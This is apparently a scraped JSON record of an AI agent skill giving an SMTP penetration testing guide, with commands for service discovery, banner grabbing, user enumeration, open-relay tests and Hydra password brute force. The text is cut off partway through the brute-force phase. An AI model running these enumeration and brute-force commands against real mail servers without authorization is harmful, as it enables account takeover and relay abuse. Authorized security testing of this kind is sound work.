{
  "id": "antigravity-smtp-penetration-testing",
  "name": "SMTP Penetration Testing",
  "slug": "smtp-penetration-testing",
  "description": "This skill should be used when the user asks to \"perform SMTP penetration testing\", \"enumerate email users\", \"test for open mail relays\", \"grab SMTP banners\", \"brute force email credentials\", or \"assess mail server security\". It provides comprehensive techniques for testing SMTP server security.",
  "category": "Security & Systems",
  "source": "antigravity",
  "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
  "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/smtp-penetration-testing",
  "content": "\n# SMTP Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Nmap with SMTP scripts\nsudo apt-get install nmap\n\n# Netcat\nsudo apt-get install netcat\n\n# Hydra for brute force\nsudo apt-get install hydra\n\n# SMTP user enumeration tool\nsudo apt-get install smtp-user-enum\n\n# Metasploit Framework\nmsfconsole\n```\n\n### Required Knowledge\n- SMTP protocol fundamentals\n- Email architecture (MTA, MDA, MUA)\n- DNS and MX records\n- Network protocols\n\n### Required Access\n- Target SMTP server IP/hostname\n- Written authorization for testing\n- Wordlists for enumeration and brute force\n\n## Outputs and Deliverables\n\n1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings\n2. **User Enumeration Results** - Valid email addresses discovered\n3. **Relay Test Results** - Open relay status and exploitation potential\n4. **Remediation Recommendations** - Security hardening guidance\n\n## Core Workflow\n\n### Phase 1: SMTP Architecture Understanding\n\n```\nComponents: MTA (transfer) → MDA (delivery) → MUA (client)\n\nPorts: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternative)\n\nWorkflow: Sender MUA → Sender MTA → DNS/MX → Recipient MTA → MDA → Recipient MUA\n```\n\n### Phase 2: SMTP Service Discovery\n\nIdentify SMTP servers and versions:\n\n```bash\n# Discover SMTP ports\nnmap -p 25,465,587,2525 -sV TARGET_IP\n\n# Aggressive service detection\nnmap -sV -sC -p 25 TARGET_IP\n\n# SMTP-specific scripts\nnmap --script=smtp-* -p 25 TARGET_IP\n\n# Discover MX records for domain\ndig MX target.com\nnslookup -type=mx target.com\nhost -t mx target.com\n```\n\n### Phase 3: Banner Grabbing\n\nRetrieve SMTP server information:\n\n```bash\n# Using Telnet\ntelnet TARGET_IP 25\n# Response: 220 mail.target.com ESMTP Postfix\n\n# Using Netcat\nnc TARGET_IP 25\n# Response: 220 mail.target.com ESMTP\n\n# Using Nmap\nnmap -sV -p 25 TARGET_IP\n# Version detection extracts banner info\n\n# Manual SMTP commands\nEHLO test\n# Response reveals supported extensions\n```\n\nParse banner information:\n\n```\nBanner reveals:\n- Server software (Postfix, Sendmail, Exchange)\n- Version information\n- Hostname\n- Supported SMTP extensions (STARTTLS, AUTH, etc.)\n```\n\n### Phase 4: SMTP Command Enumeration\n\nTest available SMTP commands:\n\n```bash\n# Connect and test commands\nnc TARGET_IP 25\n\n# Initial greeting\nEHLO attacker.com\n\n# Response shows capabilities:\n250-mail.target.com\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-8BITMIME\n250 DSN\n```\n\nKey commands to test:\n\n```bash\n# VRFY - Verify user exists\nVRFY admin\n250 2.1.5 admin@target.com\n\n# EXPN - Expand mailing list\nEXPN staff\n250 2.1.5 user1@target.com\n250 2.1.5 user2@target.com\n\n# RCPT TO - Recipient verification\nMAIL FROM:<test@attacker.com>\nRCPT TO:<admin@target.com>\n# 250 OK = user exists\n# 550 = user doesn't exist\n```\n\n### Phase 5: User Enumeration\n\nEnumerate valid email addresses:\n\n```bash\n# Using smtp-user-enum with VRFY\nsmtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP\n\n# Using EXPN method\nsmtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP\n\n# Using RCPT method\nsmtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP\n\n# Specify port and domain\nsmtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com\n```\n\nUsing Metasploit:\n\n```bash\nuse auxiliary/scanner/smtp/smtp_enum\nset RHOSTS TARGET_IP\nset USER_FILE /usr/share/wordlists/metasploit/unix_users.txt\nset UNIXONLY true\nrun\n```\n\nUsing Nmap:\n\n```bash\n# SMTP user enumeration script\nnmap --script smtp-enum-users -p 25 TARGET_IP\n\n# With custom user list\nnmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP\n```\n\n### Phase 6: Open Relay Testing\n\nTest for unauthorized email relay:\n\n```bash\n# Using Nmap\nnmap -p 25 --script smtp-open-relay TARGET_IP\n\n# Manual testing via Telnet\ntelnet TARGET_IP 25\nHELO attacker.com\nMAIL FROM:<test@attacker.com>\nRCPT TO:<victim@external-domain.com>\nDATA\nSubject: Relay Test\nThis is a test.\n.\nQUIT\n\n# If accepted (250 OK), server is open relay\n```\n\nUsing Metasploit:\n\n```bash\nuse auxiliary/scanner/smtp/smtp_relay\nset RHOSTS TARGET_IP\nrun\n```\n\nTest variations:\n\n```bash\n# Test different sender/recipient combinations\nMAIL FROM:<>\nMAIL FROM:<test@[attacker_IP]>\nMAIL FROM:<test@target.com>\n\nRCPT TO:<test@external.com>\nRCPT TO:<\"test@external.com\">\nRCPT TO:<test%external.com@target.com>\n```\n\n### Phase 7: Brute Force Authentication\n\nTest for weak SMTP credentials:\n\n```bash\n# Using Hydra\nhydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP\n\n# With specific port and SSL\nhydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp\n\n# Multiple users\nhydra -L users.tx",
  "tags": [
    "ai",
    "workflow",
    "document",
    "security",
    "vulnerability"
  ],
  "useCases": [],
  "scrapedAt": "2026-01-26T13:21:52.307Z"
}